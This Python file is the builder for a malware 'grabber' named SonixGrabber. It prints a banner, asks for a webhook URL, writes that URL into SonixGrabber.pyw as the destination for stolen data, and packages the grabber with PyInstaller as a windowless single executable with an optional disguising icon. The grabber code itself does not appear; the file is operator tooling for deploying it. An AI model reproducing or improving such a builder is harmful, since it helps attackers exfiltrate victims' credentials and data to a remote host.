import os
import subprocess
import threading
import time
import sys

# ANSI escape sequences for dark blue
NAVY_BLUE = '\033[34m'
RESET = '\033[0m'

# ASCII art title
ascii_art = f"""
{NAVY_BLUE}

  ██████  ▒█████   ███▄    █  ██▓▒██   ██▒     ▄████  ██▀███   ▄▄▄       ▄▄▄▄    ▄▄▄▄   ▓█████  ██▀███  
▒██    ▒ ▒██▒  ██▒ ██ ▀█   █ ▓██▒▒▒ █ █ ▒░    ██▒ ▀█▒▓██ ▒ ██▒▒████▄    ▓█████▄ ▓█████▄ ▓█   ▀ ▓██ ▒ ██▒
░ ▓██▄   ▒██░  ██▒▓██  ▀█ ██▒▒██▒░░  █   ░   ▒██░▄▄▄░▓██ ░▄█ ▒▒██  ▀█▄  ▒██▒ ▄██▒██▒ ▄██▒███   ▓██ ░▄█ ▒
  ▒   ██▒▒██   ██░▓██▒  ▐▌██▒░██░ ░ █ █ ▒    ░▓█  ██▓▒██▀▀█▄  ░██▄▄▄▄██ ▒██░█▀  ▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄  
▒██████▒▒░ ████▓▒░▒██░   ▓██░░██░▒██▒ ▒██▒   ░▒▓███▀▒░██▓ ▒██▒ ▓█   ▓██▒░▓█  ▀█▓░▓█  ▀█▓░▒████▒░██▓ ▒██▒
▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░▓  ▒▒ ░ ░▓ ░    ░▒   ▒ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░▒▓███▀▒░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒  ░ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░ ▒ ░░░   ░▒ ░     ░   ░   ░▒ ░ ▒░  ▒   ▒▒ ░▒░▒   ░ ▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░
░  ░  ░  ░ ░ ░ ▒     ░   ░ ░  ▒ ░ ░    ░     ░ ░   ░   ░░   ░   ░   ▒    ░    ░  ░    ░    ░     ░░   ░ 
      ░      ░ ░           ░  ░   ░    ░           ░    ░           ░  ░ ░       ░         ░  ░   ░     
                                                                              ░       ░                 
{RESET}
"""

def validate_webhook(webhook):
    return 'api/webhooks' in webhook

def replace_webhook(webhook):
    file_path = 'SonixGrabber.pyw'

    with open(file_path, 'r', encoding='utf-8') as file:
        lines = file.readlines()

    for i, line in enumerate(lines):
        if line.strip().startswith('hook ='):
            lines[i] = f'hook = "{webhook}"\n'
            break

    with open(file_path, 'w', encoding='utf-8') as file:
        file.writelines(lines)

def select_icon():
    icon_path = input(f"{NAVY_BLUE}Enter the path to your icon file (or press Enter to skip): {RESET}")
    return icon_path

def add_icon():
    choice = input(f"{NAVY_BLUE}Do you want to add an icon? (y/n): {RESET}").lower()
    return choice == 'y'

def build_exe():
    webhook = input(f"{NAVY_BLUE}Enter your webhook URL: {RESET}")

    if validate_webhook(webhook):
        replace_webhook(webhook)
        
        # Ask the user for an output name
        output_name = input(f"{NAVY_BLUE}Output Name: {RESET}")
        if not output_name:
            output_name = 'output'  # Default name if not provided

        icon_choice = add_icon()

        if icon_choice:
            icon_path = select_icon()
            if not icon_path:
                print(f"{NAVY_BLUE}Error: No icon file selected.{RESET}")
                return
            else:
                icon_option = f' --icon={icon_path}'
        else:
            icon_option = ''

        print(f"{NAVY_BLUE}Build process started. This may take a while...{RESET}")

        # Customize PyInstaller build command with output name
        build_command = (f'pyinstaller --onefile --noconsole --name {output_name} '
                         f'SonixGrabber.pyw{icon_option}')

        # Function to run PyInstaller build command in the background
        def run_build():
            with open(os.devnull, 'w') as devnull:
                subprocess.run(build_command, shell=True, stdout=devnull, stderr=devnull)

        # Start build process in a new thread
        build_thread = threading.Thread(target=run_build)
        build_thread.start()

        # Animated "Building..." message
        animation = "|/-\\"
        idx = 0

        while build_thread.is_alive():
            sys.stdout.write(f"\r{NAVY_BLUE}Building... {animation[idx % len(animation)]}{RESET}")
            sys.stdout.flush()
            idx += 1
            time.sleep(0.1)

        # Once the build is done, clear the line and show success message
        sys.stdout.write("\r" + " " * 20 + "\r")
        print(f"{NAVY_BLUE}Build process completed successfully.{RESET}")
        print(f"{NAVY_BLUE}HAWK TUAH{RESET}")
    else:
        print(f"{NAVY_BLUE}Error: Invalid webhook URL!{RESET}")

if __name__ == "__main__":
    print(ascii_art)  # Display the ASCII art as the title
    build_exe()